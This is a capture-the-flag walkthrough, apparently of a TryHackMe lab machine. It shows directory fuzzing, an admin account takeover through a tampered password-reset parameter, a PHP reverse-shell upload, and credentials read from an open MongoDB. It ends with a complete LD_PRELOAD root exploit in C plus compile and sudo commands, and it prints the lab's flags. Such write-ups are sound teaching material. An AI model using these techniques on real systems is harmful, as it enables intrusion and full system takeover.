# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---

![Pasted image 20250502152628.png](../../IMAGES/Pasted%20image%2020250502152628.png)



![Pasted image 20250502152636.png](../../IMAGES/Pasted%20image%2020250502152636.png)

We got some stuff in here, a `Track Order` functionality and a contact form, I tried `XSS` on the contact form but no luck, if we try `test` on the `Track Order`, we can see this:


![Pasted image 20250502152734.png](../../IMAGES/Pasted%20image%2020250502152734.png)

We get this URL format:

```
http://10.10.167.2/v2/admin/track_orders?awb=test&srchorder=
```

Seems like there is a `v2` directory which may contain some sort of login page, let's fuzz and check it out:


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.167.2/FUZZ" -ic -c -t 200 -e .php,.html,.git

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.167.2/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php .html .git
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 184ms]
index.html [Status: 200, Size: 19607, Words: 2975, Lines: 540, Duration: 184ms]
.php [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 184ms]
assets [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 173ms]
career.html [Status: 200, Size: 9289, Words: 1509, Lines: 254, Duration: 173ms]
v2 [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 172ms]
```


![Pasted image 20250502152831.png](../../IMAGES/Pasted%20image%2020250502152831.png)

If we go to `v2`, we can see this, let's register a test account:


![Pasted image 20250502152959.png](../../IMAGES/Pasted%20image%2020250502152959.png)

Now, we can login with our test credentials:

![Pasted image 20250502153027.png](../../IMAGES/Pasted%20image%2020250502153027.png)

![Pasted image 20250502153032.png](../../IMAGES/Pasted%20image%2020250502153032.png)


We got a lot of options, If we go to our profile, we can notice this:


![Pasted image 20250502153146.png](../../IMAGES/Pasted%20image%2020250502153146.png)

We got an admin email `admin@sky.thm`, if we check the options, we can notice this:

![Pasted image 20250502153207.png](../../IMAGES/Pasted%20image%2020250502153207.png)

We got a `ResetUser` functionality, let's check it out:

![Pasted image 20250502153307.png](../../IMAGES/Pasted%20image%2020250502153307.png)

We can reset passwords, let's proceed to exploitation.


# EXPLOITATION
---

If we submit a test password to our proxy, we can see the following request:


![Pasted image 20250502153425.png](../../IMAGES/Pasted%20image%2020250502153425.png)

If we can modify the `uname` parameter, we can maybe perform `account takeover` on the admin user to set a new password:


![Pasted image 20250502153527.png](../../IMAGES/Pasted%20image%2020250502153527.png)

It says password changed, let's try logging in the admin account:

![Pasted image 20250502153606.png](../../IMAGES/Pasted%20image%2020250502153606.png)


![Pasted image 20250502153616.png](../../IMAGES/Pasted%20image%2020250502153616.png)

There we go, account takeover worked, if we remember the `profile`, we can upload images, we can maybe embed a reverse shell and gain access:

![Pasted image 20250502153910.png](../../IMAGES/Pasted%20image%2020250502153910.png)



![Pasted image 20250502154001.png](../../IMAGES/Pasted%20image%2020250502154001.png)


If we click on `Edit Profile`, the request goes through, if we capture the request, we can get to know the destination path:

![Pasted image 20250502154228.png](../../IMAGES/Pasted%20image%2020250502154228.png)

We need to go to `/v2/profileimages`

![Pasted image 20250502154317.png](../../IMAGES/Pasted%20image%2020250502154317.png)

So, let's simply go to:

```
http://10.10.167.2/v2/profileimages/thm_shell.php
```

If we have our listener ready, we can receive the connection:


![Pasted image 20250502154354.png](../../IMAGES/Pasted%20image%2020250502154354.png)

Let's proceed with privilege escalation.


# PRIVILEGE ESCALATION
---

First thing to do is to get a stable shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250502154453.png](../../IMAGES/Pasted%20image%2020250502154453.png)

Let's use linpeas:

![Pasted image 20250502154957.png](../../IMAGES/Pasted%20image%2020250502154957.png)

There are some suspicious connections on here, if we check what's the port `27017`
used for:

![Pasted image 20250502155127.png](../../IMAGES/Pasted%20image%2020250502155127.png)

As seen, this port may be used by `mongodb`, let's go inside of it:


```
www-data@sky:/tmp$ mongo 127.0.0.1
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("0a43af77-9ada-4f50-a5fa-d84612e18426") }
MongoDB server version: 4.4.6
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
	https://community.mongodb.com
---
The server generated these startup warnings when booting:
 2025-05-02T19:24:29.566+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
 2025-05-02T19:25:08.352+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
---
---
 Enable MongoDB's free cloud-based monitoring service, which will then receive and display
 metrics about your deployment (disk utilization, CPU, operation statistics, etc).

 The monitoring data will be available on a MongoDB website with a unique URL accessible to you
 and anyone you share the URL with. MongoDB may use this information to make product
 improvements and to suggest MongoDB products and deployment options to you.

 To enable free monitoring, run the following command: db.enableFreeMonitoring()
 To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
---
> show dbs
admin 0.000GB
backup 0.000GB
config 0.000GB
local 0.000GB
>
```

We can do this:

```mongo
> use backup
> show collections
collection
user

> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

As seen, we got credentials:

```
webdeveloper:BahamasChapp123!@#
```

We can go into ssh with those:

![Pasted image 20250502155718.png](../../IMAGES/Pasted%20image%2020250502155718.png)

We are now able to read `user.txt`:

```
webdeveloper@sky:~$ cat user.txt
63191e4ece37523c9fe6bb62a5e64d45
```

If we use `sudo -l`, we notice this:

```
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
 (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

There's a strange binary on here, the interesting stuff on here is the:

```
LD_PRELOAD
```

LD_PRELOAD is an environment variable in Linux that allows users to specify a shared library (.so file) to be loaded _before_ all other system libraries during program execution. This mechanism is typically used for debugging or overriding specific functions in existing libraries. However, in a security context, it can be abused for privilege escalation if an attacker controls the`LD_PRELOAD` variable and can execute a binary with elevated privileges (e.g., via sudo). By crafting a malicious shared library that defines functions with the same names as those used by the target binary (e.g.,`system()`,`exec()`, or even constructor functions), an attacker can hijack the program's execution flow. When the binary runs, it loads the attacker's library first, executing arbitrary code with the privileges of the target process, in this case, root”due to the`sudo` permissions granted to`/usr/bin/sky_backup_utility`.


Knowing all this, we can get a root shell by doing this:

1. Creating a malicious `exploit.c` file:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BOLD "\033[1m"
#define RED "\033[31m"
#define RESET "\033[0m"

void _init() {
 fprintf(stderr, BOLD RED"[+]" RESET" Unsetting LD_PRELOAD\n");
 unsetenv("LD_PRELOAD");

 fprintf(stderr, BOLD RED"[+]" RESET" Setting EUID/EGID to 0\n");
 if(setgid(0) < 0) { 
 perror("setgid"); 
 _exit(1); 
 }
 if(setuid(0) < 0) { 
 perror("setuid"); 
 _exit(1); 
 }
 
 fprintf(stderr, BOLD RED"[+]" RESET" Spawning root shell!\n");
 system("/bin/bash -p");
 fprintf(stderr, BOLD RED"[!]" RESET" Shell execution failed!\n");
 _exit(0);
}
```

2. Compiling it:

```
gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
```

3. Executing the Binary with LD_PRELOAD

```
sudo LD_PRELOAD=./exploit.so /usr/bin/sky_backup_utility
```

Once we use it, we get a root shell:

![Pasted image 20250502161151.png](../../IMAGES/Pasted%20image%2020250502161151.png)

Let's get root flag and finish the CTF:

```
root@sky:/tmp# cat /root/root.txt
3a62d897c40a815ecbe267df2f533ac6
```

![Pasted image 20250502161303.png](../../IMAGES/Pasted%20image%2020250502161303.png)

